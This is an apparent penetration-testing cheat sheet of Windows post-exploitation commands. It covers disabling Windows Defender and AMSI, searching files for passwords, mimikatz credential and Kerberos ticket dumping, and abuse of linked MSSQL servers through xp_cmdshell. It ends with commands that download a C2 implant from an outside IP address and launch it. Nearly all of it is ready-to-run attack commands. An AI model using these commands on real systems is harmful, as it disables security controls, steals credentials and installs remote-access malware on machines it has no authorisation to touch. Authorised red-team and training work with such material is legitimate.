## Disable Antivirus  
### With Admin privileges  
Add a folder to the list of paths for which Windows Defender scheduled and real-time scanning is disabled:  
`PS C:\> Add-MpPreference –ExclusionPath “C:\Temp\User"`
  
Disable real-time protection:  
`PS C:\> Set-MpPreference –DisableRealtimeMonitoring $True`  

Some AMSI (Antimalware scan interface) bypass techniques:  
- `PS C:\> powershell.exe –version 2` (Downgrade to PowerShell 2.0 (.NET Framework 3.5 is required)  
- Crash the AMSI process by running payloads available « amsi.fail » (https://amsi.fail).  
  
## Search passwords  
### Enumerate local secrets by searching for keywords in files  
```
findstr /s /i /m "password" "C:\path\to\search\directory\*.*"
```
/s (findstr) or -Recurse (Get-ChildItem) option ensures that the search is performed in all subdirectories.  
/i (findstr) option or -CaseSensitive (Select-String) option performs a case-insensitive search.  
/m (findstr) option is used to print only the filenames with the matching content.  
`Get-ChildItem -Path C:\* -Include *.xml,*.ini,*.txt,*.config,*.ps1,*.bat, *.properties,*.cfg,*.vbs,*.wsf,*.cmd -ErrorAction SilentlyContinue -Recurse | Select-String "adm","<domain>","pass","pwd","mdp","cred","config","username","SecureString" -List | Select-Object -ExpandProperty Path`  
  
    
### With Admin privileges - Extract passwords  
`mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"`  
  
**Explanation :**  
`privilege::debug` & `token::elevate` Elevate Privileges to extract the credentials  
`sekurlsa::logonpasswords` Extracts creds from lsass (memory)  
`lsadump::lsa /inject` Extracts from lsass (service)  
`lsadump::sam` Extracts creds from SAM  

## Extract Kerberos tickets from memory  
### With Admin privileges 
   
`mimikatz.exe "privilege::debug" "token::elevate" "kerberos::list /export" "exit"`    


## MSSQL Privesc   
### Check if the local MSSQL DB is linked to another instance:  
`Get-SqlServerLinkCrawl -Verbose`    
    
**Manual trusted link queery** (From https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)   
  
`Get-SQLQuery -Instance "DBWEB,1433" -Query "select * from openquery(""m4sqlz.m4c.loc"", 'select * from information_schema.tables')"`  
  
**Enable xp_cmdshell and check it**  
`Get-SQLQuery -Instance "DBWEB,1433" -Query 'SELECT * FROM OPENQUERY("m4sqlz.m4c.loc", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'`  
  
`Get-SQLQuery -Instance "DBWEB,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [m4sqlz.m4c.loc]'`  
  
`Get-SQLQuery -Instance "DBWEB,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [m4sqlz.m4c.loc]'`    
  
  
If you see the results of @@selectname, it worked  
Then :    
`osql -E -S "DBWEB" -Q "EXECUTE('xp_cmdshell whoami') AT [m4sqlz.m4c.loc];"`   
Example dilvering a C2 implant:      
`osql -E -S "DBWEB" -Q "EXECUTE('xp_cmdshell ''powershell.exe iwr -Uri http://10.10.16.20:8080/bc2.exe -OutFile c:\Temp\JFE\bc2.exe''') AT [m4sqlz.m4c.loc];"`    
`osql -E -S "DBWEB" -Q "EXECUTE('xp_cmdshell ''powershell.exe -c Start-Process -NoNewWindow -FilePath C:\Temp\JFE\bc2.exe''') AT [m4sqlz.m4c.loc];"`      
  
    
  
